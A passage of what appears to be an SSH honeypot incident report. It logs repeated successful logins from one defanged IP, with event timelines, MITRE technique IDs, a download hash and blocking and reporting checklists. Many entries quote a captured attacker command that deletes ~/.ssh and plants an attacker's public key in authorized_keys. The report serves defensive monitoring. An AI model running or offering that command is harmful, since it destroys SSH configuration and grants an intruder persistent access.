| **Last Seen** | 2026-06-12 09:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 09:28:33` | `cowrie.session.connect` |
| `2026-06-12 09:28:33` | `cowrie.client.version` |
| `2026-06-12 09:28:33` | `cowrie.client.kex` |
| `2026-06-12 09:28:34` | `cowrie.login.success` |
| `2026-06-12 09:28:35` | `cowrie.session.params` |
| `2026-06-12 09:28:35` | `cowrie.command.input` |
| `2026-06-12 09:28:35` | `cowrie.command.failed` |
| `2026-06-12 09:28:36` | `cowrie.log.closed` |
| `2026-06-12 09:28:36` | `cowrie.session.params` |
| `2026-06-12 09:28:36` | `cowrie.command.input` |
| `2026-06-12 09:28:36` | `cowrie.session.file_download` |
| `2026-06-12 09:28:36` | `cowrie.log.closed` |
| `2026-06-12 09:28:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.87[.]78` to AbuseIPDB if not already reported
- [ ] Block `102.220.87[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbb6886a8673

| Field | Detail |
|---|---|
| **Source IP** | `102.220.87[.]78` |
| **First Seen** | 2026-06-12 09:28 |
| **Last Seen** | 2026-06-12 09:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 09:28:39` | `cowrie.session.connect` |
| `2026-06-12 09:28:39` | `cowrie.client.version` |
| `2026-06-12 09:28:40` | `cowrie.client.kex` |
| `2026-06-12 09:28:41` | `cowrie.login.success` |
| `2026-06-12 09:28:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.87[.]78` to AbuseIPDB if not already reported
- [ ] Block `102.220.87[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a523d27fb8a

| Field | Detail |
|---|---|
| **Source IP** | `102.220.87[.]78` |
| **First Seen** | 2026-06-12 09:30 |
| **Last Seen** | 2026-06-12 09:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 09:30:47` | `cowrie.session.connect` |
| `2026-06-12 09:30:47` | `cowrie.client.version` |
| `2026-06-12 09:30:48` | `cowrie.client.kex` |
| `2026-06-12 09:30:49` | `cowrie.login.success` |
| `2026-06-12 09:30:49` | `cowrie.session.params` |
| `2026-06-12 09:30:49` | `cowrie.command.input` |
| `2026-06-12 09:30:49` | `cowrie.command.failed` |
| `2026-06-12 09:30:50` | `cowrie.log.closed` |
| `2026-06-12 09:30:50` | `cowrie.session.params` |
| `2026-06-12 09:30:50` | `cowrie.command.input` |
| `2026-06-12 09:30:50` | `cowrie.session.file_download` |
| `2026-06-12 09:30:50` | `cowrie.log.closed` |
| `2026-06-12 09:30:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.87[.]78` to AbuseIPDB if not already reported
- [ ] Block `102.220.87[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30316d5ef214

| Field | Detail |
|---|---|
| **Source IP** | `102.220.87[.]78` |
| **First Seen** | 2026-06-12 09:30 |
| **Last Seen** | 2026-06-12 09:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 09:30:54` | `cowrie.session.connect` |
| `2026-06-12 09:30:54` | `cowrie.client.version` |
| `2026-06-12 09:30:54` | `cowrie.client.kex` |
| `2026-06-12 09:30:55` | `cowrie.login.success` |
| `2026-06-12 09:30:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.87[.]78` to AbuseIPDB if not already reported
- [ ] Block `102.220.87[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8e5de756356

| Field | Detail |
|---|---|
| **Source IP** | `102.220.87[.]78` |
| **First Seen** | 2026-06-12 09:33 |
| **Last Seen** | 2026-06-12 09:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 09:33:05` | `cowrie.session.connect` |
| `2026-06-12 09:33:05` | `cowrie.client.version` |
| `2026-06-12 09:33:06` | `cowrie.client.kex` |
| `2026-06-12 09:33:07` | `cowrie.login.success` |
| `2026-06-12 09:33:07` | `cowrie.session.params` |
| `2026-06-12 09:33:07` | `cowrie.command.input` |
| `2026-06-12 09:33:07` | `cowrie.command.failed` |
| `2026-06-12 09:33:08` | `cowrie.log.closed` |
| `2026-06-12 09:33:08` | `cowrie.session.params` |
| `2026-06-12 09:33:08` | `cowrie.command.input` |
| `2026-06-12 09:33:09` | `cowrie.session.file_download` |
| `2026-06-12 09:33:09` | `cowrie.log.closed` |
| `2026-06-12 09:33:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.87[.]78` to AbuseIPDB if not already reported
- [ ] Block `102.220.87[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af7987ca1543

| Field | Detail |
|---|---|
| **Source IP** | `102.220.87[.]78` |
| **First Seen** | 2026-06-12 09:33 |
| **Last Seen** | 2026-06-12 09:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 09:33:12` | `cowrie.session.connect` |
| `2026-06-12 09:33:12` | `cowrie.client.version` |
| `2026-06-12 09:33:12` | `cowrie.client.kex` |
| `2026-06-12 09:33:13` | `cowrie.login.success` |
| `2026-06-12 09:33:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.87[.]78` to AbuseIPDB if not already reported
- [ ] Block `102.220.87[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c74a101886f

| Field | Detail |
|---|---|
| **Source IP** | `102.220.87[.]78` |
| **First Seen** | 2026-06-12 09:35 |
| **Last Seen** | 2026-06-12 09:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 09:35:18` | `cowrie.session.connect` |
| `2026-06-12 09:35:18` | `cowrie.client.version` |
| `2026-06-12 09:35:18` | `cowrie.client.kex` |
| `2026-06-12 09:35:19` | `cowrie.login.success` |
| `2026-06-12 09:35:20` | `cowrie.session.params` |
| `2026-06-12 09:35:20` | `cowrie.command.input` |
| `2026-06-12 09:35:20` | `cowrie.command.failed` |
| `2026-06-12 09:35:20` | `cowrie.log.closed` |
| `2026-06-12 09:35:20` | `cowrie.session.params` |
| `2026-06-12 09:35:20` | `cowrie.command.input` |
| `2026-06-12 09:35:21` | `cowrie.session.file_download` |
| `2026-06-12 09:35:21` | `cowrie.log.closed` |
| `2026-06-12 09:35:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.87[.]78` to AbuseIPDB if not already reported
- [ ] Block `102.220.87[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76f93541c583

| Field | Detail |
|---|---|
| **Source IP** | `102.220.87[.]78` |
| **First Seen** | 2026-06-12 09:35 |
| **Last Seen** | 2026-06-12 09:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 09:35:24` | `cowrie.session.connect` |
| `2026-06-12 09:35:24` | `cowrie.client.version` |
| `2026-06-12 09:35:24` | `cowrie.client.kex` |
| `2026-06-12 09:35:25` | `cowrie.login.success` |
| `2026-06-12 09:35:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.87[.]78` to AbuseIPDB if not already reported
- [ ] Block `102.220.87[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fc7449ac23a

| Field | Detail |
|---|---|
| **Source IP** | `102.220.87[.]78` |
| **First Seen** | 2026-06-12 09:44 |
| **Last Seen** | 2026-06-12 09:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 09:44:42` | `cowrie.session.connect` |
| `2026-06-12 09:44:42` | `cowrie.client.version` |
| `2026-06-12 09:44:42` | `cowrie.client.kex` |
| `2026-06-12 09:44:43` | `cowrie.login.success` |
| `2026-06-12 09:44:44` | `cowrie.session.params` |
| `2026-06-12 09:44:44` | `cowrie.command.input` |
| `2026-06-12 09:44:44` | `cowrie.command.failed` |
| `2026-06-12 09:44:45` | `cowrie.log.closed` |
| `2026-06-12 09:44:45` | `cowrie.session.params` |
| `2026-06-12 09:44:45` | `cowrie.command.input` |
| `2026-06-12 09:44:45` | `cowrie.session.file_download` |
| `2026-06-12 09:44:45` | `cowrie.log.closed` |
| `2026-06-12 09:44:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.87[.]78` to AbuseIPDB if not already reported
- [ ] Block `102.220.87[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-098ebad15bb7

| Field | Detail |
|---|---|
| **Source IP** | `102.220.87[.]78` |
| **First Seen** | 2026-06-12 09:44 |
| **Last Seen** | 2026-06-12 09:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 09:44:48` | `cowrie.session.connect` |
| `2026-06-12 09:44:48` | `cowrie.client.version` |
| `2026-06-12 09:44:49` | `cowrie.client.kex` |
| `2026-06-12 09:44:50` | `cowrie.login.success` |
| `2026-06-12 09:44:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.87[.]78` to AbuseIPDB if not already reported
- [ ] Block `102.220.87[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b6ef2e3d395

| Field | Detail |
|---|---|
| **Source IP** | `102.220.87[.]78` |
| **First Seen** | 2026-06-12 09:46 |
| **Last Seen** | 2026-06-12 09:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 09:46:57` | `cowrie.session.connect` |
| `2026-06-12 09:46:57` | `cowrie.client.version` |
| `2026-06-12 09:46:57` | `cowrie.client.kex` |
| `2026-06-12 09:46:58` | `cowrie.login.success` |
| `2026-06-12 09:46:59` | `cowrie.session.params` |
| `2026-06-12 09:46:59` | `cowrie.command.input` |
| `2026-06-12 09:46:59` | `cowrie.command.failed` |
| `2026-06-12 09:47:00` | `cowrie.log.closed` |
| `2026-06-12 09:47:00` | `cowrie.session.params` |
| `2026-06-12 09:47:00` | `cowrie.command.input` |
| `2026-06-12 09:47:00` | `cowrie.session.file_download` |
| `2026-06-12 09:47:00` | `cowrie.log.closed` |
| `2026-06-12 09:47:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.87[.]78` to AbuseIPDB if not already reported
- [ ] Block `102.220.87[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e43a974555c

| Field | Detail |
|---|---|
| **Source IP** | `102.220.87[.]78` |
| **First Seen** | 2026-06-12 09:47 |
| **Last Seen** | 2026-06-12 09:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 09:47:03` | `cowrie.session.connect` |
| `2026-06-12 09:47:03` | `cowrie.client.version` |
| `2026-06-12 09:47:04` | `cowrie.client.kex` |
| `2026-06-12 09:47:05` | `cowrie.login.success` |
| `2026-06-12 09:47:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.87[.]78` to AbuseIPDB if not already reported
- [ ] Block `102.220.87[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52920085ff24

| Field | Detail |
|---|---|
| **Source IP** | `102.220.87[.]78` |
| **First Seen** | 2026-06-12 09:53 |
| **Last Seen** | 2026-06-12 09:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 09:53:50` | `cowrie.session.connect` |
| `2026-06-12 09:53:50` | `cowrie.client.version` |
| `2026-06-12 09:53:51` | `cowrie.client.kex` |
| `2026-06-12 09:53:52` | `cowrie.login.success` |
| `2026-06-12 09:53:52` | `cowrie.session.params` |
| `2026-06-12 09:53:52` | `cowrie.command.input` |
| `2026-06-12 09:53:52` | `cowrie.command.failed` |
| `2026-06-12 09:53:53` | `cowrie.log.closed` |
| `2026-06-12 09:53:53` | `cowrie.session.params` |
| `2026-06-12 09:53:53` | `cowrie.command.input` |
| `2026-06-12 09:53:53` | `cowrie.session.file_download` |
| `2026-06-12 09:53:53` | `cowrie.log.closed` |
| `2026-06-12 09:53:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.87[.]78` to AbuseIPDB if not already reported
- [ ] Block `102.220.87[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e90336f2c822

| Field | Detail |
|---|---|
| **Source IP** | `102.220.87[.]78` |
| **First Seen** | 2026-06-12 09:53 |
| **Last Seen** | 2026-06-12 09:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 09:53:57` | `cowrie.session.connect` |
| `2026-06-12 09:53:57` | `cowrie.client.version` |
| `2026-06-12 09:53:57` | `cowrie.client.kex` |
| `2026-06-12 09:53:58` | `cowrie.login.success` |
| `2026-06-12 09:53:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.87[.]78` to AbuseIPDB if not already reported
- [ ] Block `102.220.87[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e4f53584652

| Field | Detail |
|---|---|
| **Source IP** | `102.220.87[.]78` |
| **First Seen** | 2026-06-12 10:05 |
| **Last Seen** | 2026-06-12 10:05 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 10:05:16` | `cowrie.session.connect` |
| `2026-06-12 10:05:16` | `cowrie.client.version` |
| `2026-06-12 10:05:16` | `cowrie.client.kex` |
| `2026-06-12 10:05:18` | `cowrie.login.success` |
| `2026-06-12 10:05:18` | `cowrie.session.params` |
| `2026-06-12 10:05:18` | `cowrie.command.input` |
| `2026-06-12 10:05:18` | `cowrie.command.failed` |
| `2026-06-12 10:05:19` | `cowrie.log.closed` |
| `2026-06-12 10:05:19` | `cowrie.session.params` |
| `2026-06-12 10:05:19` | `cowrie.command.input` |
| `2026-06-12 10:05:19` | `cowrie.session.file_download` |
| `2026-06-12 10:05:19` | `cowrie.log.closed` |
| `2026-06-12 10:05:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.87[.]78` to AbuseIPDB if not already reported
- [ ] Block `102.220.87[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3f5b7684547

| Field | Detail |
|---|---|
| **Source IP** | `102.220.87[.]78` |
| **First Seen** | 2026-06-12 10:05 |
| **Last Seen** | 2026-06-12 10:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 10:05:22` | `cowrie.session.connect` |
| `2026-06-12 10:05:22` | `cowrie.client.version` |
| `2026-06-12 10:05:23` | `cowrie.client.kex` |
| `2026-06-12 10:05:24` | `cowrie.login.success` |
| `2026-06-12 10:05:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.87[.]78` to AbuseIPDB if not already reported
- [ ] Block `102.220.87[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2c187dc997f

| Field | Detail |
|---|---|
| **Source IP** | `102.220.87[.]78` |
| **First Seen** | 2026-06-12 10:09 |
| **Last Seen** | 2026-06-12 10:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 10:09:48` | `cowrie.session.connect` |
| `2026-06-12 10:09:48` | `cowrie.client.version` |
| `2026-06-12 10:09:49` | `cowrie.client.kex` |
| `2026-06-12 10:09:50` | `cowrie.login.success` |
